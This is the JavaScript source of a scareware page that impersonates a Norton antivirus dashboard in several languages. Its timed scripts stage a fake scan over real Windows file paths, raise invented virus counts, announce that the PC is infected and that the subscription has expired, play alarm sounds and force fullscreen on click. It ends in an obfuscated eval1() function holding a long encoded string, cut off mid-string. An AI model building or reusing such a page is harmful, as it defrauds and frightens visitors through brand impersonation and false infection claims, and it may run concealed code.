        document.getElementById("w1_4").innerHTML = "Aggiornamenti sulla protezione: ";
        document.getElementById("w1_5").innerHTML = "Attuale";
        document.getElementById("w1_6").innerHTML = "Ultima scansione: ";
        document.getElementById("w1_7").innerHTML = "Non disponibile";
        document.getElementById("w1_8").innerHTML = "| Scansione rapida";
        document.getElementById("w1_9").innerHTML = "Licenze utilizzate: ";
        document.getElementById("w1_10").innerHTML = "1 di 5";
        document.getElementById("w1_11").innerHTML = "| Installa su un altro dispositivo";
        document.getElementById("w1_12").innerHTML = "Sicurezza";
        document.getElementById("w1_13").innerHTML = "Protetto";
        document.getElementById("w1_14").innerHTML = "Identità";
        document.getElementById("w1_13a").innerHTML = "Protetto";
        document.getElementById("w1_15").innerHTML = "Prestazioni";
        document.getElementById("w1_13b").innerHTML = "Protetto";
        document.getElementById("w1_16").innerHTML = "Altro di Norton";
        document.getElementById("w1_13c").innerHTML = "Protetto";
        document.getElementById("w1_17").innerHTML = "STATO DELLA SOTTOSCRIZIONE: ";
        document.getElementById("w1_18").innerHTML = "30 giorni rimanenti";
        document.getElementById("w2_1").innerHTML = "Scansione rapida";
        document.getElementById("w2_2").innerHTML = "In esecuzione";
        document.getElementById("w2_3").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
        document.getElementById("w2_4").innerHTML = "In esecuzione";
        document.getElementById("w2_5").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
        document.getElementById("w2_6").innerHTML = "Riepilogo risultati:";
        document.getElementById("w2_7").innerHTML = "[+] Totale elementi scansionati:";
        document.getElementById("w2_8").innerHTML = "[+] Totale minacce per la sicurezza rilevate:";
        document.getElementById("w2_9").innerHTML = "[+] Totale minacce per la sicurezza risolte:";
        document.getElementById("w2_10").innerHTML = "Totale minacce per la sicurezza che richiedono interventi:";
        document.getElementById("w2_11").innerHTML = "Pausa";
        document.getElementById("w2_12").innerHTML = "Interrompi";
        document.getElementById("w3_1").innerHTML = "Il PC contiene 5 virus!";
        document.getElementById("w3_2").innerHTML = "INTERVENTO NECESSARIO!";
        document.getElementById("w3_3").innerHTML = "La tua sottoscrizione a Norton è scaduta!";
        document.getElementById("w3_4").innerHTML = "Rinnovala ora per mantenere il PC al sicuro.";
        document.getElementById("w3_5").innerHTML = "Un PC non protetto è esposto al rischio di virus e altri malware.";
        document.getElementById("w3_6").innerHTML = "Continua...";
        document.getElementById("w4_1").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1a").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1b").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1c").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1d").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_2").innerHTML = "Rischio elevato";
        document.getElementById("w4_2a").innerHTML = "Rischio elevato";
        document.getElementById("w4_2b").innerHTML = "Rischio elevato";
        document.getElementById("w4_2c").innerHTML = "Rischio elevato";
        document.getElementById("w4_3").innerHTML = "Rischio medio";
        document.getElementById("w4_4").innerHTML = "Origine";
        document.getElementById("w4_4a").innerHTML = "Origine";
        document.getElementById("w4_4b").innerHTML = "Origine";
        document.getElementById("w4_4c").innerHTML = "Origine";
        document.getElementById("w4_4d").innerHTML = "Origine";
        document.getElementById("w4_5").innerHTML = "Non disponibile";
        document.getElementById("w4_5a").innerHTML = "Non disponibile";
        document.getElementById("w4_5b").innerHTML = "Non disponibile";
        document.getElementById("w4_5c").innerHTML = "Non disponibile";
        document.getElementById("w4_5d").innerHTML = "Non disponibile";
        document.getElementById("w4_6").innerHTML = "Attività";
        document.getElementById("w4_6a").innerHTML = "Attività";
        document.getElementById("w4_6b").innerHTML = "Attività";
        document.getElementById("w4_6c").innerHTML = "Attività";
        document.getElementById("w4_6d").innerHTML = "Attività";
        document.getElementById("w4_7").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7a").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7b").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7c").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7d").innerHTML = "Correzioni delle minacce eseguite: 1";
    }

    if (lang == "el") {
        document.getElementById("menu").innerHTML = "ΠΡΟΪΟΝΤΑ ΚΑΙ ΥΠΗΡΕΣΙΕΣ &nbsp&nbsp&nbsp ΥΠΟΣΤΗΡΙΞΗ &nbsp&nbsp&nbsp ΔΩΡΕΑΝ ΔΟΚΙΜΑΣΤΙΚΕΣ ΕΚΔΟΣΕΙΣ";
        document.getElementById("menu_b").innerHTML = "Νομική σημείωση | Άδεια χρήσης | Πολιτική προστασίας προσωπικών δεδομένων | Ευκαιρίες καριέρας | Cookie | Χάρτης τοποθεσίας | Κατάσταση συστήματος";
        document.getElementById("head1").innerHTML = "Οι απειλές του κυβερνοχώρου έχουν εξελιχθεί. Το ίδιο συμβαίνει και με την προστασία μας.";
        document.getElementById("head2").innerHTML =
            "Norton 360. Ολοκληρωμένη προστασία με ασφάλεια συσκευής που περιλαμβάνει λογισμικό προστασίας από ιούς, VPN, ένα πρόγραμμα διαχείρισης κωδικών πρόσβασης και πολλά άλλα. Όλα σε μία μόνο λύση.";
    }

    if (lang == "pt") {
        document.getElementById("menu").innerHTML = "PRODUTOS E SERVIÇOS &nbsp&nbsp&nbsp SUPORTE &nbsp&nbsp&nbsp AVALIAÇÕES GRATUITAS";
        document.getElementById("menu_b").innerHTML = "Aviso Legal | Contrato de Licença | Política de Privacidade | Carreiras | Cookies | Mapa do Site | Estado do Sistema";
        document.getElementById("head1").innerHTML = "As ciberameaças evoluíram. A nossa proteção também.";
        document.getElementById("head2").innerHTML = "Norton 360. Proteção abrangente com segurança do dispositivo, incluindo antivírus, além de uma VPN, um gestor de palavras-passe e muito mais. Tudo numa única solução.";
        document.getElementById("w1_ico1").style.right = "165px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "55px";
        document.getElementById("w1_1").innerHTML = "Configurações";
        document.getElementById("w1_2").innerHTML = "Ajuda";
        document.getElementById("w1_3").innerHTML = "Você está protegido";
        document.getElementById("w1_4").innerHTML = "Atualizações de segurança: ";
        document.getElementById("w1_5").innerHTML = "Atual";
        document.getElementById("w1_6").innerHTML = "Última verificação: ";
        document.getElementById("w1_7").innerHTML = "Não disponível";
        document.getElementById("w1_8").innerHTML = "| Verificação rápida";
        document.getElementById("w1_9").innerHTML = "Licenças usadas: ";
        document.getElementById("w1_10").innerHTML = "1 de 5";
        document.getElementById("w1_11").innerHTML = "| Instalar em outro dispositivo";
        document.getElementById("w1_12").innerHTML = "Segurança";
        document.getElementById("w1_13").innerHTML = "Protegido";
        document.getElementById("w1_14").innerHTML = "Identidade";
        document.getElementById("w1_13a").innerHTML = "Protegido";
        document.getElementById("w1_15").innerHTML = "Performance";
        document.getElementById("w1_13b").innerHTML = "Protegido";
        document.getElementById("w1_16").innerHTML = "Mais Norton";
        document.getElementById("w1_13c").innerHTML = "Protegido";
        document.getElementById("w1_17").innerHTML = "STATUS DA ASSINATURA: ";
        document.getElementById("w1_18").innerHTML = "Faltam 30 dias";
        document.getElementById("w2_1").innerHTML = "Verificação rápida";
        document.getElementById("w2_2").innerHTML = "Trabalhando";
        document.getElementById("w2_3").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
        document.getElementById("w2_4").innerHTML = "Trabalhando";
        document.getElementById("w2_5").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
        document.getElementById("w2_6").innerHTML = "Resumo dos resultados";
        document.getElementById("w2_7").innerHTML = "[+] Total de itens verificados:";
        document.getElementById("w2_8").innerHTML = "[+] Total de riscos de segurança detectados:";
        document.getElementById("w2_9").innerHTML = "[+] Total de riscos de segurança resolvidos:";
        document.getElementById("w2_10").innerHTML = "Total de riscos de segurança que requerem atenção:";
        document.getElementById("w2_11").innerHTML = "Pausar";
        document.getElementById("w2_12").innerHTML = "Parar";
        document.getElementById("w3_1").innerHTML = "Seu PC está infectado com 5 vírus!";
        document.getElementById("w3_2").innerHTML = "AÇÃO NECESSÁRIA!";
        document.getElementById("w3_3").innerHTML = "Sua assinatura do Norton expirou!";
        document.getElementById("w3_4").innerHTML = "Renove agora para manter seu PC protegido!";
        document.getElementById("w3_5").innerHTML = "Se o seu PC estiver desprotegido, ele corre risco de pegar vírus e outros malwares.";
        document.getElementById("w3_6").innerHTML = "Continuar...";
        document.getElementById("w4_1").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1a").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1b").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1c").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1d").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_2").innerHTML = "Alto risco";
        document.getElementById("w4_2a").innerHTML = "Alto risco";
        document.getElementById("w4_2b").innerHTML = "Alto risco";
        document.getElementById("w4_2c").innerHTML = "Alto risco";
        document.getElementById("w4_3").innerHTML = "Risco médio";
        document.getElementById("w4_4").innerHTML = "Origem";
        document.getElementById("w4_4a").innerHTML = "Origem";
        document.getElementById("w4_4b").innerHTML = "Origem";
        document.getElementById("w4_4c").innerHTML = "Origem";
        document.getElementById("w4_4d").innerHTML = "Origem";
        document.getElementById("w4_5").innerHTML = "Não disponível";
        document.getElementById("w4_5a").innerHTML = "Não disponível";
        document.getElementById("w4_5b").innerHTML = "Não disponível";
        document.getElementById("w4_5c").innerHTML = "Não disponível";
        document.getElementById("w4_5d").innerHTML = "Não disponível";
        document.getElementById("w4_6").innerHTML = "Atividade";
        document.getElementById("w4_6a").innerHTML = "Atividade";
        document.getElementById("w4_6b").innerHTML = "Atividade";
        document.getElementById("w4_6c").innerHTML = "Atividade";
        document.getElementById("w4_6d").innerHTML = "Atividade";
        document.getElementById("w4_7").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7a").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7b").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7c").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7d").innerHTML = "Ações realizadas contra ameaças: 1";
    }

    if (lang == "pl") {
        document.getElementById("menu").innerHTML = "PRODUKTY I USŁUGI &nbsp&nbsp&nbsp POMOC &nbsp&nbsp&nbsp BEZPŁATNE WERSJE PRÓBNE";
        document.getElementById("menu_b").innerHTML = "Informacje prawne | Umowa licencyjna | Zasady ochrony danych osobowych | Praca | Pliki cookie | Mapa witryny | Stan systemu";
        document.getElementById("head1").innerHTML = "Zagrożenia sieciowe ewoluowały. Nasza ochrona również.";
        document.getElementById("head2").innerHTML = "Norton 360. Kompleksowa ochrona urządzeń, w tym antywirus, sieć VPN, menedżer haseł i nie tylko. Zintegrowane rozwiązanie.";
    }

    if (lang == "nl") {
        document.getElementById("menu").innerHTML = "PRODUCTEN EN SERVICES &nbsp&nbsp&nbsp ONDERSTEUNING &nbsp&nbsp&nbsp GRATIS PROEFVERSIES";
        document.getElementById("menu_b").innerHTML = "Juridische informatie | Licentieovereenkomst | Privacybeleid | Cookies | Site-index | RSS | Systeemstatus";
        document.getElementById("head1").innerHTML = "Cyberbedreigingen zijn geëvolueerd. En daarmee ook onze bescherming.";
        document.getElementById("head2").innerHTML = "NIEUWE Norton 360. Uitgebreide bescherming met apparaatbeveiliging waaronder antivirus, een VPN, wachtwoordbeheer en meer. Allemaal in één oplossing.";
    }

    if (lang == "sv") {
        document.getElementById("menu").innerHTML = "PRODUKTER OCH TJÄNSTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp PROVA UTAN KOSTNAD";
        document.getElementById("menu_b").innerHTML = "Juridiskt meddelande | Licensavtal | Sekretesspolicy | Lediga tjänster | Cookies | Webbplatsöversikt | Systemstatus";
        document.getElementById("head1").innerHTML = "Hot på internet har utvecklats. Det har vårt skydd också.";
        document.getElementById("head2").innerHTML = "Norton 360. Omfattande skydd med säkerhet för digitala enheter inklusive antivirus, plus VPN, en lösenordshanterare med mera. Allt i en enda lösning.";
    }

    if (lang == "tr") {
        document.getElementById("menu").innerHTML = "ÜRÜNLER VE HİZMETLER &nbsp&nbsp&nbsp DESTEK &nbsp&nbsp&nbsp ÜCRETSİZ DENEME";
        document.getElementById("menu_b").innerHTML = "Yasal Bildirim | Lisans Sözleşmesi | Gizlilik İlkesi | Kariyer | Tanımlama Bilgileri | Site Haritası | Sistem Durumu";
        document.getElementById("head1").innerHTML = "Siber tehditler gelişti. Koruma çözümlerimiz de öyle.";
        document.getElementById("head2").innerHTML = "Norton 360. Antivirüs, parola yöneticisi, PC Cloud Backup‡‡, 4 ve daha fazlasını içeren cihaz güvenliği ile kapsamlı koruma. Hepsi tek bir çözümde.";
    }
    if (lang == "ja") {
        document.getElementById("menu").innerHTML = "製品とサービス &nbsp&nbsp&nbsp ノートン ブログ &nbsp&nbsp&nbsp サポート &nbsp&nbsp&nbsp 無料体験版";
        document.getElementById("menu_b").innerHTML = "日本 | 利用規約 | 使用許諾契約 | プライバシーポリシー | 採用情報 | クッキー | サイトマップ | システムの状態";
        document.getElementById("head1").innerHTML = "進化するサイバー脅威。ノートン製品も進化。";
        document.getElementById("head2").innerHTML =
            "ノートン 360 がリリースされました。ウイルス対策機能、VPN、パスワード管理機能など、包括的な保護機能によってデバイスセキュリティを確保することができます。すべての機能が 1 つのソリューションに導入されています。";
    }
    if (lang == "ru") {
        document.getElementById("menu").innerHTML = "ПРОДУКТЫ И УСЛУГИ &nbsp&nbsp&nbsp ПОДДЕРЖКА &nbsp&nbsp&nbsp БЕСПЛАТНЫЕ ПРОБНЫЕ ВЕРСИИ";
        document.getElementById("menu_b").innerHTML = "Юридическая информация | Лицензионное соглашение | Политика конфиденциальности | Вакансии | Файлы cookie | Карта сайта | Состояние системы";
        document.getElementById("head1").innerHTML = "Киберугрозы развиваются. Наша защита тоже.";
        document.getElementById("head2").innerHTML =
            "Norton 360. Комплексная защита устройств, в которую входят антивирусные программы, Password Manager, резервное копирование в облаке для ПК‡‡, 4 и многое другое. Все в одном решении.";
    }
</script>
<script language="JavaScript" type="text/javascript">
    setTimeout(function () {
        document.getElementById("win2").style.display = "block";
    }, 2000);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "143";
    }, 2600);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Windows\System32\csrss.exe";
    }, 3000);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Windows\System32\sihost.exe";
    }, 3700);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "218";
    }, 4000);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Program Files\Windows Defender\MSASCuiL.exe";
    }, 4600);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "398";
        document.getElementById("cnt2").style.color = "#dd0000";
        document.getElementById("cnt2").innerHTML = "1";
        document.getElementById("cnt4").style.color = "#dd0000";
        document.getElementById("cnt4").innerHTML = "1";
        document.getElementById("win2_line_red").style.display = "block";
        document.getElementById("beep").play();
    }, 5000);
    setTimeout(function () {
        document.getElementById("vir1").style.bottom = "235px";
    }, 5100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\SgrmBroker.exe";
    }, 5200);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "SEMgrSvc";
    }, 5800);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "538";
    }, 6000);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "NcaSvc";
    }, 6700);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "791";
        document.getElementById("cnt2").innerHTML = "2";
        document.getElementById("cnt4").innerHTML = "2";
    }, 7000);
    setTimeout(function () {
        document.getElementById("vir1").style.bottom = "440px";
        document.getElementById("vir1").style.opacity = "0";
        document.getElementById("vir2").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 7100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\DDFs";
    }, 7500);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1021";
        document.getElementById("cnt2").innerHTML = "3";
        document.getElementById("cnt4").innerHTML = "3";
    }, 8000);
    setTimeout(function () {
        document.getElementById("vir2").style.bottom = "440px";
        document.getElementById("vir2").style.opacity = "0";
        document.getElementById("vir3").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 8100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\Recovery";
    }, 8300);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1273";
    }, 9000);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\DriverState";
    }, 9200);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "tempRoot\system32\DRIVERS\bowser.sys";
    }, 9700);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1589";
        document.getElementById("cnt2").innerHTML = "4";
        document.getElementById("cnt4").innerHTML = "4";
    }, 10000);
    setTimeout(function () {
        document.getElementById("vir3").style.bottom = "440px";
        document.getElementById("vir3").style.opacity = "0";
        document.getElementById("vir4").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 10100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\WinBioDatabase";
    }, 10500);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1723";
    }, 11000);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "vmickvpexchange";
    }, 11600);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1916";
    }, 12000);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "HidBtn";
    }, 12300);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "2038";
        document.getElementById("cnt2").innerHTML = "80";
        document.getElementById("cnt4").innerHTML = "80";
    }, 13000);
    setTimeout(function () {
        document.getElementById("vir4").style.bottom = "440px";
        document.getElementById("vir4").style.opacity = "0";
        document.getElementById("vir5").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 13100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "WdNisDrv";
    }, 13200);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "rdbss";
    }, 13900);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\dot3svc.dll";
    }, 14700);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "UASPStor";
    }, 15500);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "2038";
        document.getElementById("vir5").style.opacity = "0";
        document.getElementById("w2_4").innerHTML = "Done";
        if (lang == "pt") document.getElementById("w2_4").innerHTML = "Terminado";
        if (lang == "es") document.getElementById("w2_4").innerHTML = "Listo";
        if (lang == "fr") document.getElementById("w2_4").innerHTML = "Effectué";
        if (lang == "it") document.getElementById("w2_4").innerHTML = "Fatto";
        document.getElementById("w2_5").innerHTML = "";
        document.getElementById("path2").innerHTML = "";
        document.getElementById("win3").style.display = "none";
        document.getElementById("link_black").href = "#";
    }, 16000);

    function showmess() {
        document.getElementById("mess").style.display = "block";
    }
</script>
<script type="text/javascript">
    /*$(document).ready(function(){
  $("#open_popup").click(function(){
$(".chrome-alert").show();
});
});*/
</script>
<script type="text/javascript">
    addEventListener("click", function () {
        var
            el = document.documentElement
            , rfs =
            el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
        ;
        rfs.call(el);
    });
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("map").style.display = "block";
        document.getElementById("warning").play();
    }, 10);
</script>
<script type="text/javascript">
    /*=============HELPER================*/
    var Helper = (function () {

        var data = [];

        var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
        var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];

        function setDays(d) {
            if ((d.constructor !== Array) || d.length !== 7)
                return false;

            days = d;
        }

        function setMonths(m) {
            if ((m.constructor !== Array) || m.length !== 12)
                return false;

            months = m;
        }

        function getDate() {
            var now = new Date();
            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
            return (now.getDate()) + " " + month + " " + now.getFullYear();
        }

        function getMonth() {
            var now = new Date();
            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
            return month;
        }

        function getDay() {
            var now = new Date();
            var day = typeof (days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
            return day;
        }

        function getDayOfMonth() {
            var now = new Date();
            var day = ('0' + now.getDate()).slice(-2);
            return day;
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        function findAncestor(element, name) {
            while ((element = element.parentElement) && !element.classList.contains(name)) ;
            return element;
        }

        function bindOnQuery(query, callback, action = 'click') {
            var elements = document.querySelectorAll(query);
            for (var i = 0; i < elements.length; i++) {
                elements[i].addEventListener(action, callback, false);
            }
        }

        function bindOnId(name, callback, action = 'click') {
            var element = document.getElementById(name);
            element.addEventListener(action, callback, false);
        }

        function replaceMarkers(text, markers) {
            for (key in markers) {
                var search = '%' + key + '%';
                text = text.replace(new RegExp(search, 'g'), markers[key]);
            }

            return text;
        }

        return {
            setDays: setDays,
            setMonths: setMonths,
            getDate: getDate,
            getDay: getDay,
            getMonth: getMonth,
            getDayOfMonth: getDayOfMonth,
            getUrlParameter: getUrlParameter,
            findAncestor: findAncestor,
            bindOnQuery: bindOnQuery,
            bindOnId: bindOnId,
            replaceMarkers: replaceMarkers
        };

    })();
</script>


<script type="text/javascript">function eval1() {
        var s1 = unescape("o%7Ewl%7Drxw.%3B9n%7Fju%3B.%3BA.%3BB.@K%7Fj%7B.%3B9%7C%3A.%3CM%7Ewn%7Cljyn.%3BA.%3B%3By.%3B%3E@O%81v.%3B%3E@N%7C%82%818.%3B%3E%3CL.%3B%3E%3CJx.%3B%3EA9t%7Fx8.%3B%3E%3CLK8.%3B%3E%3CLL8JU.%3B%3EA9t.%3B%3E@L8.%3B%3E%3CL.%3B%3E%3CJ.%3B%3E@M.%3B%3E%3CK8.%3B%3E%3CMW.%3B%3E@O%81x.%3B%3E@Mvt%83x8.%3B%3E%3CLK8.%3B%3E%3CL.%3B%3E%3CL.%3B%3E@K8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3EA%3C%818.%3B%3E%3CL.%3B%3E%3COJY.%3B%3E@N.%3B%3EA%3D.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3EA%3C.%3B%3EA%3D%81.%3B%3EA%3D.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJY%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CM8.%3B%3E%3CL.%3B%3E%3COJY.%3B%3EA%3B%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJU%608.%3B%3E%3CL.%3B%3E%3COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3COJW.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJYL%81%7F.%3B%3EA%3C%81%83.%3B%3EA%3A%608.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ%80%80.%3B%3EA%3A%83.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWa%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJYL8.%3B%3E%3CL.%3B%3E%3COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3COJW.%3B%3EA%3Ct%7F.%3B%3EA%3A8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ%83.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWa.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJUb.%3B%3E@K8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ.%3B%3EA%3C%818.%3B%3E%3CL.%3B%3E%3COJY.%3B%3E@N.%3B%3EA%3D.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3EA%3C.%3B%3EA%3D8.%3B%3E%3CL.%3B%3E%3COJW.%3B%3E@N.%3B%3E@L.%3B%3E@M8.%3B%3E%3CL.%3B%3E%3COJY%81.%3B%3EA%3A.%3B%3E@N%81.%3B%3EA9.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV%7F.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJU%60.%3B%3E@N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@N.%3B%3EA%3C%82.%3B%3EA%3D8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CLLc8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJY.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJU%60.%3B%3E@N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb%7FL8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@M.%3B%3E@N%81.%3B%3E@M.%3B%3E%3CJUa.%3B%3E%3CJUa8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMX.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb%7FL8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CL.%3B%3E@M.%3B%3E@N%81.%3B%3E@M.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW8.%3B%3E%3CL.%3B%3E%3COJW%838.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3COJW.%3B%3EA%3C.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMV.%3B%3E%3CJUb%83.%3B%3EA%3A8.%3B%3E%3CL.%3B%3E%3COJX%83.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3E@N.%3B%3E@K.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWV8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb%838.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CK%83.%3B%3EA%3C8.%3B%3E%3CL.%3B%3E%3COJYL%808.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%